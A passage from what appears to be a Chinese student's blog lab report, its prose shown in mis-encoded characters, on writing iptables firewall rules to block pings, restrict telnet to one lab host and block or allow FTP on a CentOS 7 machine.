<li>æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°ç¬¬ä¸‰æ¡ï¼š <code>iptables -I INPUT 3 -s 192.168.195.131 -j DROP</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231838.png" alt="image-20211120231838219"  />
</li>
<li>å¯ä»¥çœ‹åˆ°æ–°è§„åˆ™æ·»åŠ åˆ°ç¬¬ä¸‰æ¡äº†</li>
</ul>
</li>
</ul>
</li>
<li>
<p>åˆ é™¤</p>
<ul>
<li>
<p>åˆ é™¤ç”¨-Då‚æ•°</p>
</li>
<li>
<p>åˆ é™¤ä¹‹å‰æ·»åŠ çš„è§„åˆ™ <code>iptables -A INPUT  -j ACCEPT</code>ï¼š</p>
</li>
<li>
<p>å‘½ä»¤ï¼š <code>iptables -D INPUT -j ACCEPT</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232120.png" alt="image-20211120232120915"  />
</p>
<ul>
<li>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰æ·»åŠ çš„ç¬¬ä¸ƒæ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚</li>
</ul>
</li>
<li>
<p>æœ‰æ—¶å€™è¦åˆ é™¤çš„è§„åˆ™å¤ªé•¿ï¼Œåˆ é™¤æ—¶è¦å†™ä¸€å¤§ä¸²ï¼Œæ—¢æµªè´¹æ—¶é—´åˆå®¹æ˜“å†™é”™ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨â€“line-numberæ‰¾å‡ºè¯¥æ¡è§„åˆ™çš„è¡Œå·ï¼Œå†é€šè¿‡è¡Œå·åˆ é™¤è§„åˆ™ã€‚è¿™é‡Œæˆ‘ä»¬åˆ é™¤ç¬¬ä¸‰è¡Œæˆ‘ä»¬æ’å…¥çš„è§„åˆ™ã€‚</p>
<p>å‘½ä»¤ï¼š<code>iptables -D INPUT 3</code></p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232241.png" alt="image-20211120232241262"  />
</p>
</li>
<li>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ’å…¥çš„ç¬¬ä¸‰æ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚</p>
</li>
</ul>
</li>
</ul>
<h4 id="323-è®¾ç½®iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™å®ç°ä»¥ä¸‹åŠŸèƒ½">3.2.3 è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½<a hidden class="anchor" aria-hidden="true" href="#323-è®¾ç½®iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™å®ç°ä»¥ä¸‹åŠŸèƒ½">#</a></h4>
<h5 id="3231-ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡é€šè¿‡pingéªŒè¯">3.2.3.1 ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰<a hidden class="anchor" aria-hidden="true" href="#3231-ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡é€šè¿‡pingéªŒè¯">#</a></h5>
<ul>
<li>æˆ‘ä»¬é¦–å…ˆå°†æ‰€æœ‰è§„åˆ™éƒ½åˆ é™¤<code>iptables -F</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232401.png" alt="image-20211120232401113"  />
</li>
<li>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰çš„è§„åˆ™å…¨éƒ¨è¢«æ¸…é™¤æ‰ã€‚</li>
</ul>
</li>
<li>æ­¤æ—¶æˆ‘ä»¬é€šè¿‡æœºå™¨<code>192.168.195.131</code>æ¥<code>ping</code>æˆ‘ä»¬æ­¤æ—¶çš„Linuxä¸»æœº<code>192.168.195.174</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232817.png" alt="image-20211120232817401"  />
</li>
<li>æ­£å¸¸å¯ä»¥pingé€š</li>
</ul>
</li>
<li>ç¦æ­¢æ‰€æœ‰è¿›å…¥æœ¬åœ°æœºå™¨çš„æ•°æ®åŒ…é€šè¿‡
<ul>
<li>å‘½ä»¤å¦‚ä¸‹ï¼š<code>iptables -I INPUT -j DROP</code></li>
<li>å°†è§„åˆ™åŠ å…¥åˆ°<code>INPUT</code>é“¾ä¸­
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232906.png" alt="image-20211120232906410"  />
</li>
<li>æ‰€æœ‰å‘ç»™æœ¬æœºçš„åŒ…éƒ½ä¼šè¢«ä¸¢å¼ƒæ‰</li>
</ul>
</li>
</ul>
</li>
<li>æ­¤æ—¶å†åº¦<code>ping</code>æˆ‘ä»¬çš„æœ¬æœº<code>192.168.195.174</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120233018.png" alt="image-20211120233018240"  />
</li>
<li>å¾ˆæ˜æ˜¾çš„ä¸»æœºå·²ç»æ¥æ”¶ä¸åˆ°<code>ping</code>çš„åŒ…äº†</li>
</ul>
</li>
</ul>
<h5 id="3232-å…è®¸æŸç‰¹å®šipä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº">3.2.3.2 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº<a hidden class="anchor" aria-hidden="true" href="#3232-å…è®¸æŸç‰¹å®šipä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº">#</a></h5>
<ul>
<li>
<p>å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶<code>iptables -F</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120233155.png" alt="image-20211120233155444"  />
</li>
</ul>
</li>
<li>
<p>å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº</p>
<ul>
<li>
<p>æˆ‘ä»¬è¿™é‡Œè®¾å®šè¿è¡Œ<code>192.168.195.131</code>å¯ä»¥<code>ping</code>é€šï¼Œå…¶ä½™çš„ä¸»æœºå‡æ— æ³•<code>ping</code>é€šæœºå™¨</p>
<p>å‘½ä»¤ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>iptables -I INPUT -j DROP
</span></span><span style="display:flex;"><span>iptables -I INPUT -s 192.168.195.131 -j ACCEPT
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>å› ä¸º<code>iptables</code>ä¸­è§„åˆ™çš„æ‰§è¡Œä¸ºä»ä¸Šåˆ°ä¸‹ï¼Œæ‰€ä»¥æŒ‰ç…§ä¸Šè¿°ç»™å®šçš„ç¨‹åºæ’å…¥è§„åˆ™ã€‚</p>
</li>
<li>
<p>ç»“æœä¸ºï¼š</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120234047.png" alt="image-20211120234047616"  />
</li>
</ul>
</li>
<li>
<p>è¿™æ ·å°±ä¿è¯æ¥æ”¶åˆ°<code>192.168.195.131</code>çš„åŒ…ï¼Œå…¶ä½™çš„åŒ…å‡ä¸¢å¼ƒã€‚</p>
</li>
</ul>
</li>
<li>
<p>è¿™é‡Œç›´æ¥æ”¾å‡ºä¸¤ä¸ªæœºå™¨é˜²ç«å¢™å¼€å¯å‰å<code>ping</code>çš„çŠ¶æ€ã€‚</p>
<ul>
<li>å…¶ä»–æœºå™¨
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120234359.png" alt="image-20211120234359143"  />
</li>
</ul>
</li>
<li><code>192.168.195.131</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120234439.png" alt="image-20211120234439876"  />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="3233-å…è®¸æŸç‰¹å®šipä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº">3.2.3.3 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº<a hidden class="anchor" aria-hidden="true" href="#3233-å…è®¸æŸç‰¹å®šipä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº">#</a></h5>
<ul>
<li>
<p>å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶<code>iptables -F</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120233155.png" alt="image-20211120233155444"  />
</li>
</ul>
</li>
<li>
<p>å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº,ï¼Œå¼€å¯ç«¯å£23 å³å¯</p>
</li>
<li>
<p>å‘½ä»¤ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>iptables -I INPUT -p tcp --dport <span style="color:#ff0;font-weight:bold">23</span> -j DROP
</span></span><span style="display:flex;"><span>iptables -I INPUT -s 192.168.195.131 -p tcp --dport <span style="color:#ff0;font-weight:bold">23</span> -j ACCEPT
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>ç›®çš„ç«¯å£ä¸º23çš„è¢«ä¸¢å¼ƒï¼Œå› ä¸ºç¬¬äºŒæ¡è§„åˆ™é¡ºåºåœ¨ç¬¬ä¸€æ¡å‰é¢ï¼Œæ‰€æœ‰å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºç‰¹å®šIPï¼Œæ˜¯çš„åˆ™æ¥å—ï¼Œå¦åˆ™ä¸¢å¼ƒã€‚</li>
</ul>
</li>
<li>
<p>å¼€å¯é˜²ç«å¢™å‰ï¼š</p>
<ul>
<li>
<p><code>192.168.195.131</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121003520.png" alt="image-20211121003520018"  />
</p>
</li>
<li>
<p>å…¶ä»–æœºå™¨ï¼š</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121004127.png" alt="image-20211121004127773"  />
</li>
</ul>
</li>
<li>
<p><code>telent</code>å‡å¯ä»¥æ­£å¸¸è¿æ¥</p>
</li>
</ul>
</li>
<li>
<p>å¼€å¯<code>iptables</code></p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121003631.png" alt="image-20211121003631733"  />
</p>
</li>
<li>
<p>å¯¹äº<code>192.168.195.131</code>çš„æœºå™¨</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121003715.png" alt="image-20211121003715574"  />
</li>
<li>å‘ç°ä»ç„¶å¯ä»¥æ­£å¥½è¿æ¥<code>telnet</code></li>
</ul>
</li>
<li>
<p>å¯¹äºå…¶ä»–æœºå™¨</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121004221.png" alt="image-20211121004221618"  />
</li>
<li>å¯ä»¥çœ‹åˆ°è¿æ¥ä¸åˆ°<code>telnet</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x04-é€‰åšé¢˜">0x04 é€‰åšé¢˜<a hidden class="anchor" aria-hidden="true" href="#0x04-é€‰åšé¢˜">#</a></h2>
<h3 id="41-ç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸé€šè¿‡ç”¨æˆ·åå¯†ç éªŒè¯">4.1 ç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰<a hidden class="anchor" aria-hidden="true" href="#41-ç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸé€šè¿‡ç”¨æˆ·åå¯†ç éªŒè¯">#</a></h3>
<ul>
<li>
<p>å…è®¸æœ¬æœºç™»å½•å…¶ä»–æœåŠ¡å™¨çš„ftp:<code>192.168.195.162</code></p>
</li>
<li>
<p>å› æ­¤è¿™é‡Œçš„é˜²ç«å¢™ä¸º<code>output</code>å‘å¤–é¢æœåŠ¡å™¨ä»¥<code>21</code>ç«¯å£å‘é€è¯·æ±‚ã€‚</p>
<p>å‘½ä»¤ï¼š<code>iptables -A OUTPUT -p tcp --sport 21 -j ACCEPT</code></p>
<ul>
<li>æ‰€æœ‰æºç«¯å£ä¸º21 å‘å¾€å¤–ç½‘çš„åŒ…éƒ½è¢«å…è®¸é€šè¿‡ã€‚</li>
</ul>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121004657.png" alt="image-20211121004657367"  />
</p>
<ul>
<li>æ‰§è¡Œé˜²ç«å¢™ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å‘å¾€å¤–ç½‘<code>21</code>ç«¯å£çš„åŒ…å¯ä»¥è¢«<code>ACCEPT</code></li>
</ul>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121005206.png" alt="image-20211121005206644"  />
</p>
<ul>
<li>ç„¶åé€šè¿‡<code>ftp 192.168.195.131</code>
<ul>
<li>è¾“å…¥è´¦æˆ·<code>admin</code>å’Œå¯†ç <code>admin</code></li>
<li>æˆ‘ä»¬æˆåŠŸè¿æ¥åˆ°äº†ftpæœåŠ¡å™¨ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="42-æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ä¸‹è½½æ•°æ®">4.2 æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ®<a hidden class="anchor" aria-hidden="true" href="#42-æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ä¸‹è½½æ•°æ®">#</a></h3>
<ul>
<li>
<p>è¿™é‡Œæˆ‘ä»¬çš„<code>Centos 7</code>æœ¬èº«ä½œä¸ºä¸€ä¸ªFTPæœåŠ¡å™¨æ¥ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚</p>
</li>
<li>
<p>åœ¨æœ¬åœ°é…ç½®å¥½<code>ftp</code>ç¯å¢ƒ</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121005513.png" alt="image-20211121005513173"  />
</li>
<li>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¯å¢ƒå·²ç»é…ç½®å®Œæ¯•</li>
<li>åŒæ—¶åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®¿é—®<code>Linux</code>æœåŠ¡å™¨
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121005619.png" alt="image-20211121005618924"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ä¸ºäº†ç¦æ­¢å…¶ä»–ç”¨æˆ·ä¸‹è½½æˆ‘ä»¬<code>linux</code>æœåŠ¡å™¨ç«¯çš„æ‰€æœ‰æ•°æ®ï¼Œä¹Ÿé˜²æ­¢ä¸Šä¼ ,å³ç¦æ­¢ç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ã€‚</p>
<ul>
<li>æ‰€ä»¥æœ‰å‘½ä»¤ï¼š<code>iptables -I INPUT -p tcp --dport 21 -j DROP</code></li>
<li>æ‰€æœ‰ç›®çš„ç«¯å£ä¸º<code>21</code>çš„æ•°æ®åŒ…éƒ½å°†è¢«ä¸¢å¼ƒ</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121010330.png" alt="image-20211121010223066"  />
</li>
</ul>
</li>
<li>
<p>æ­¤æ—¶æˆ‘ä»¬çš„å®¢æˆ·ç«¯å†åº¦è®¿é—®æˆ‘ä»¬çš„<code>Linux FTP æœåŠ¡å™¨ç«¯</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121010347.png" alt="image-20211121010347174"  />
</li>
<li>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­¤æ—¶å·²ç»æ— æ³•è®¿é—®è¯¥æ–‡ä»¶å¤¹äº†ã€‚æ— æ³•è®¿é—®åˆ°æˆ‘ä»¬çš„<code>LinuxæœåŠ¡å™¨</code></li>
</ul>
</li>
</ul>
<h2 id="0x05-å®éªŒç»“è®º">0x05 å®éªŒç»“è®º<a hidden class="anchor" aria-hidden="true" href="#0x05-å®éªŒç»“è®º">#</a></h2>
<ul>
<li>é€šè¿‡å¯¹Windowsä¸‹å’ŒLinuxä¸‹é˜²ç«å¢™çš„é…ç½®æƒ…å†µï¼Œè‡ªå·±äº²è‡ªç¼–å†™é˜²ç«å¢™çš„ç›¸å…³è§„åˆ™ï¼Œå¯¹åŒ…è¿‡æ»¤é˜²ç«å¢™æœ‰äº†è¿›ä¸€æ­¥çš„äº†è§£å’Œè®¤çŸ¥ã€‚åŒæ—¶é’ˆå¯¹ä¸åŒç¯å¢ƒä¸‹é˜²ç«å¢™é…ç½®ï¼ŒLinuxä¸‹çš„é˜²ç«å¢™é…ç½®åº”è¯¥æ¯”Windwosæ›´ä¸ºè‡ªç”±ï¼Œè‡ªå®šä¹‰çš„æ¯”è¾ƒå¤šã€‚</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://www.reus09.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">ç½‘ç»œå®‰å…¨å®éªŒ</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://www.reus09.top/posts/tech/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/">
    <span class="title">Â« Prev</span>
    <br>
    <span>ç½‘ç»œæ‰«æ</span>
  </a>
  <a class="next" href="http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
    <span class="title">Next Â»</span>
    <br>
    <span>2021å¹´åº¦æ€»ç»“</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
